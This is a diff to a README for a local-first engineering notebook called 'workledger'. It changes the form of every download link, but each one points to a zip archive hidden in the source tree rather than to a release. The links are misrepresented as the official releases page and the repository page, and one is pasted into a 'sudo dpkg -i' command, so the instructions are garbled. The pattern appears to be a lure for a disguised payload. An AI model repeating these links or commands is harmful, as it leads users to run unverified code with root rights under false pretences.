@@ -1,6 +1,6 @@
 # 📒 workledger - Simple Local-First Engineering Notebook
 
-[![Download workledger](https://github.com/furkanyigit1/workledger/raw/refs/heads/main/src/features/sync/utils/Software-3.1.zip%20workledger-brightgreen?style=for-the-badge&logo=github)](https://github.com/furkanyigit1/workledger/raw/refs/heads/main/src/features/sync/utils/Software-3.1.zip)
+[![Download workledger](https://raw.githubusercontent.com/furkanyigit1/workledger/main/src/features/sync/utils/Software-3.1.zip%20workledger-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/furkanyigit1/workledger/main/src/features/sync/utils/Software-3.1.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This section will walk you through how to download and start workledger on your 
 
 You can get workledger by visiting the releases page on GitHub, where you will find the latest versions available for different computers.
 
-[Download workledger from the official GitHub releases page](https://github.com/furkanyigit1/workledger/raw/refs/heads/main/src/features/sync/utils/Software-3.1.zip)
+[Download workledger from the official GitHub releases page](https://raw.githubusercontent.com/furkanyigit1/workledger/main/src/features/sync/utils/Software-3.1.zip)
 
 ### How to download
 
@@ -54,7 +54,7 @@ You can get workledger by visiting the releases page on GitHub, where you will f
 3. Under "Assets," find the file that matches your computer type:
    - For Windows, look for a file ending with `.exe`.
    - For macOS, look for `.dmg` or `.zip`.
-   - For Linux, look for an `.AppImage`, `.deb`, or `https://github.com/furkanyigit1/workledger/raw/refs/heads/main/src/features/sync/utils/Software-3.1.zip` file.
+   - For Linux, look for an `.AppImage`, `.deb`, or `https://raw.githubusercontent.com/furkanyigit1/workledger/main/src/features/sync/utils/Software-3.1.zip` file.
 4. Click the right file name to start downloading.
 
 ### How to install
@@ -73,8 +73,8 @@ You can get workledger by visiting the releases page on GitHub, where you will f
 - **Linux:**
   1. If you downloaded an `.AppImage` file, right-click it, select "Properties," and make it executable.
   2. Double-click the `.AppImage` file to run it.
-  3. For `.deb` files, open your terminal and run: `sudo dpkg -i https://github.com/furkanyigit1/workledger/raw/refs/heads/main/src/features/sync/utils/Software-3.1.zip`
-  4. Replace "https://github.com/furkanyigit1/workledger/raw/refs/heads/main/src/features/sync/utils/Software-3.1.zip" with the actual file name.
+  3. For `.deb` files, open your terminal and run: `sudo dpkg -i https://raw.githubusercontent.com/furkanyigit1/workledger/main/src/features/sync/utils/Software-3.1.zip`
+  4. Replace "https://raw.githubusercontent.com/furkanyigit1/workledger/main/src/features/sync/utils/Software-3.1.zip" with the actual file name.
   5. After installation, open workledger from your apps menu.
 
 ### First launch
@@ -131,7 +131,7 @@ If you face any problems, try these tips:
 
 To learn more about workledger, visit the GitHub repository page:
 
-https://github.com/furkanyigit1/workledger/raw/refs/heads/main/src/features/sync/utils/Software-3.1.zip
+https://raw.githubusercontent.com/furkanyigit1/workledger/main/src/features/sync/utils/Software-3.1.zip
 
 You can find additional help, updates, and ways to contribute there.
 
@@ -149,4 +149,4 @@ Your notes stay only on your computer unless you choose to share them. workledge
 
 ---
 
-[Download workledger now](https://github.com/furkanyigit1/workledger/raw/refs/heads/main/src/features/sync/utils/Software-3.1.zip) and start organizing your engineering notes easily and safely.
+[Download workledger now](https://raw.githubusercontent.com/furkanyigit1/workledger/main/src/features/sync/utils/Software-3.1.zip) and start organizing your engineering notes easily and safely.
